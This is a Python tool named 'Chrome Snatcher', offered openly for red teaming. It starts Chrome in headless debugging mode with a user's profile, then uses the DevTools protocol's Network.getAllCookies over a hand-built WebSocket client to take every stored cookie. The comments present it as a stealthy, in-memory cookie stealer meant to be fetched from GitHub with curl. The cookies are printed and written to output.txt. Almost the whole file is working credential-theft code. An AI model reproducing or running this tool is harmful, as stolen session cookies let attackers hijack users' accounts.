#Standard Chrome debugger protocol endpoint: http://localhost:9222/(json/version)
#chrome --headless=new --remote-debugging-port=9222 --remote-allow-origins="*" --no-sandbox --disable-gpu --profile-directory="Profile <x>" (In my case it wasn't 0 or 1, might have to do some additional trial/error here)

# Chrome Snatcher uses headless Chrome Debugging Protocol, and after you load up the [local] user's profile (via the string above), 
# it grabs cookies, and prints to console (or outputs to file because of size, adjust as needed)
# all using native Python (instead of websockets, pychrome, etc)
# 
# The reason I built it is because I couldn't find a tool for stealthy, 1-shot cookie stealing for Chrome.
#
# Most of them rely on 
# 1) outdated methodologies
# 2) snagging the sqlite db + keychain (which would involve tricking the user) or win32crypt and decrypting offline
# 3) external dependencies 
#
# I wanted something portable that I could be cURL'd from Github, reside completely in memory, get the cookies, and get out, without dropping to disk (I added the output to disk as a stopgap below;
# it will need to be updated to fit specific use cases).  Great for Red Teaming.
#
# Copyright (c) 2023 Ben Floyd.
#
# BSD-3 Clause (New BSD License)
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, 
# THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS 
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE                                                                                              
# GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, 
# STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.


import socket
import os
import base64
import hashlib
import json
import http.client
import time
import zlib



class WebSocketClient:
    def __init__(self, host, port, path):
        self.host = host
        self.port = port
        self.path = path
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self._websocket_handshake()

    def _websocket_handshake(self):
        self.key = base64.b64encode(os.urandom(16))
        request = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {self.key.decode('utf-8')}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\r\n"
            f"User-Agent: Python/3.x custom-client\r\n\r\n"  # replace 3.x with your python version
        )
        self.socket.sendall(request.encode("utf-8"))
        response = self.socket.recv(1024)
        
        if not self.validate_handshake(response.decode('utf-8'), self.key.decode('utf-8')):
            raise Exception("WebSocket handshake failed!")

    # Tried doing this without masking, but it did not work, so apparently CDP expects it.  And here it is.
    def send(self, message):
        def mask_data(mask_key, data):
            masked_data = bytearray()
            for i in range(len(data)):
                masked_data.append(data[i] ^ mask_key[i % 4])
            return masked_data
        
        header = bytearray()
        payload = message.encode("utf-8")
        
        # Masking key
        mask_key = os.urandom(4)
        masked_payload = mask_data(mask_key, payload)
        
        # Construct the header
        header.append(0x81)  # FIN flag and opcode for text frame
        
        # Setting the MASK bit to indicate masking is applied
        if len(payload) < 126:
            header.append(len(payload) | 0x80)  # Set the mask bit
        elif len(payload) < 65536:
            header.append(126 | 0x80)  # Set the mask bit
            header.extend((len(payload)).to_bytes(2, 'big'))
        else:
            header.append(127 | 0x80)  # Set the mask bit
            header.extend((len(payload)).to_bytes(8, 'big'))
        
        # Appending the mask key to the header
        header.extend(mask_key)
        
        full_message = header + masked_payload
        print(f"Full message (header + masked payload) = {full_message}")
        self.socket.sendall(full_message)

    
    def read_full_frame(self):
        # Read the basic header (2 bytes)
        header = self.socket.recv(2)
        
        # If we can't get the basic header, return None
        if len(header) < 2:
            return None

        # Determine the basic payload length
        basic_payload_length = header[1] & 0x7F

        # Calculate the rest of the header length based on the basic payload length
        if basic_payload_length == 126:
            extended_payload_length = self.socket.recv(2)
            if len(extended_payload_length) < 2:
                return None
            payload_length = int.from_bytes(extended_payload_length, byteorder='big')
        elif basic_payload_length == 127:
            extended_payload_length = self.socket.recv(8)
            if len(extended_payload_length) < 8:
                return None
            payload_length = int.from_bytes(extended_payload_length, byteorder='big')
        else:
            payload_length = basic_payload_length

        # Now that we know the payload length, read it
        payload_data = self.socket.recv(payload_length)
        while len(payload_data) < payload_length:
            chunk = self.socket.recv(payload_length - len(payload_data))
            if not chunk:
                return None
            payload_data += chunk

        return header + (extended_payload_length if basic_payload_length in [126, 127] else b'') + payload_data


    # If it's a large payload (in my case is was 278kb), it'll be chunked by CDP, so we need to accumulate and then decompress/parse the resultant json.
    def receive(self, timeout=25):
        self.socket.settimeout(timeout)
        decompressed_buffer = bytearray()
        total_data_length = None

        while True:
            try:
                frame = self.read_full_frame()
                if not frame:
                    break

                opcode = frame[0] & 0x0F
                payload_length = frame[1] & 0x7F
                payload_start = 2

                if payload_length == 126:
                    payload_length = int.from_bytes(frame[2:4], byteorder='big')
                    payload_start = 4
                elif payload_length == 127:
                    payload_length = int.from_bytes(frame[2:10], byteorder='big')
                    payload_start = 10
                    if not total_data_length:
                        total_data_length = payload_length

                payload_data = frame[payload_start:payload_start + payload_length]
                decompressed_buffer += payload_data

                # Break the loop if we have received all the expected data
                if total_data_length and len(decompressed_buffer) >= total_data_length:
                    print(f"Received all data. Expected: {total_data_length}, Received: {len(decompressed_buffer)}")
                    break

            except TimeoutError:
                if total_data_length and len(decompressed_buffer) >= total_data_length:
                    print("Received all expected data. Proceeding to decode and decompress.")
                    break
                else:
                    print("Socket timed out. No more data to read.")
                    return decompressed_buffer

        # Proceed with decompression and decoding
        # CDP uses websocket compression (deflate), handling it here.
        # we need to 
        try:
            if (frame[0] & 0x40) != 0:  # Check if frame is compressed
                decompressor = zlib.decompressobj(wbits=-zlib.MAX_WBITS)
                decompressed_data = decompressor.decompress(decompressed_buffer)
                decompressed_buffer = decompressed_data

            decoded_response = decompressed_buffer.decode('utf-8')
            print(f"Decoded response data: (length: {len(decoded_response)}), {decoded_response}")
            ### Python has trouble outputting incredibly long strings (~1mb in some cases)
            ### so what we are doing is writing to a file to buffer it.  Change as necessary.
            with open('output.txt', 'w') as f:
                f.write(decoded_response)

            # Parse the JSON response
            response_json = json.loads(decoded_response)
            return response_json

        except Exception as e:
            print(f"Decoding or decompression error: {e}")
            return None


    
    def validate_handshake(self, response, client_key):
        if "HTTP/1.1 101" not in response:
            return False

        headers = {line.split(": ")[0]: line.split(": ")[1] for line in response.split("\r\n")[1:] if ": " in line}

        #here's some websocket weirdness...a hard-coded guid that is necessary to signify that you are talking to
        #a websocket server and not an HTTP server.
        combined = client_key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
        expected_accept = base64.b64encode(hashlib.sha1(combined.encode()).digest()).decode()
        if headers.get("Sec-WebSocket-Accept") != expected_accept:
            return False

        return True

    def close(self):
        self.socket.close()

def get_websocket_url():
    conn = http.client.HTTPConnection("localhost", 9222)
    conn.request("GET", "/json")
    response = conn.getresponse()
    data = json.loads(response.read().decode("utf-8"))
    ws_url = data[0]['webSocketDebuggerUrl']
    
    # Extracting the path from the WebSocket URL
    # Assuming the URL format is "ws://hostname:port/path"
    path = ws_url.split("localhost:9222")[-1]
    print("Path found: ", path)
    
    return path

# The fun bits

# first, we need to figure out what the websocket url for the profile we loaded is
path = get_websocket_url()
ws_client = WebSocketClient("localhost", 9222, path)

# this is what I opted for.  Change per use case.
message = {
    "id": 1,
    "method": "Network.getAllCookies"
}


ws_client.send(json.dumps(message))

# Give it a moment to think
time.sleep(5)

# Try reading multiple times
for _ in range(10):
    response = ws_client.receive()
    if response:
        break
    time.sleep(0.5)
response = ws_client.receive()
print(response)
